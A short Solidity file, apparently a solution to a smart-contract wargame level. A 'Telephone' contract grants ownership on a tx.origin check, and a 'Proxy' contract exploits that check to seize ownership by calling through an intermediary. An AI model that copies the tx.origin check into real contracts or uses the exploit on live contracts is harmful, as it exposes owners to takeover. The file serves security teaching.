/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Proxy {

  Telephone private immutable tel;

  constructor(address _tel) {
    tel = Telephone(_tel);
  }

  function changeOwner(address _owner) public {
    tel.changeOwner(_owner);
  }
}

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
